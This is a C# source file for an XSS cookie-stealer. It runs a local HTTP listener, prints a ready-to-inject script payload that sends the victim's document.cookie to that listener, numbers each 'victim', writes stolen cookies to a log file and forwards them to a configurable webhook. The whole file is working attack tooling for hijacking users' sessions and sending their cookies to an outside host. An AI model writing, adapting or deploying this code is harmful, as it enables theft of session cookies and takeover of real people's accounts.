using System;
using System.Collections.Specialized;
using System.Net;
using System.Web;
using System.Text;
using System.IO;
using static System.Net.WebRequestMethods;
using System.Text.Json.Serialization;
using System.Text.Json;

class Program
{
    public const string WEBHOOK_URL = ""; // Change this

    public static void Main(string[] args)
    {
        HttpListener listener = new HttpListener();
        string prefix = "http://localhost:8080/";
        listener.Prefixes.Add(prefix);
        listener.Start();

        Console.WriteLine(@$"[!] XSS Payload => <script>var i = new Image;i.src=""{prefix}?""+document.cookie;</script>");
        int victim_numbers = 0;
        string responseString = "";

        while (true)
        {
            victim_numbers++;
            HttpListenerContext context = listener.GetContext();
            HttpListenerRequest request = context.Request;
            HttpListenerResponse response = context.Response;
            NameValueCollection queryComponents = HttpUtility.ParseQueryString(request.Url.Query);

            Console.WriteLine($"[!] ID : {victim_numbers} => Cookies : ");

            List<string> cookies = new List<string>();
            foreach (string key in queryComponents.AllKeys)
            {
                string[] values = queryComponents.GetValues(key);
                if (values != null)
                {
                    foreach (string value in values)
                    {
                        Console.WriteLine($"{key}\t\t\t{value}");
                        cookies.Add($"{key}\t\t\t{value}");
                        SendWebhook($"{key}\t\t\t{value}");

                        using (FileStream fileStream = new FileStream("xsslogs.txt", FileMode.Create, FileAccess.Write, FileShare.Read))
                        using (StreamWriter writer = new StreamWriter(fileStream, Encoding.UTF8))
                        {
                            writer.WriteLine($"{key}\t\t\t{value}\n");
                        }
                    }
                }
            }
            
            foreach (string value in cookies)
            {
                responseString += $"[!] ID : {victim_numbers} " + value + "\n<br>";
            }

            context.Response.ContentType = "text/html";
            byte[] buffer = Encoding.UTF8.GetBytes(responseString);
            context.Response.ContentLength64 = buffer.Length;
            context.Response.OutputStream.Write(buffer, 0, buffer.Length);
            context.Response.Close();
        }
    }

    public static void SendWebhook(string data)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                var payload = new
                {
                    embeds = new object[]
                    {
                        new
                        {
                            title = "XSS",
                            description = data
                        }
                    }
                };

                string json = JsonSerializer.Serialize(payload);
                StringContent content = new StringContent(json, Encoding.UTF8, "application/json");
                HttpResponseMessage response = client.PostAsync(WEBHOOK_URL, content).Result;
            }
        }
        catch (Exception)
        {
            return;
        }
    }
}
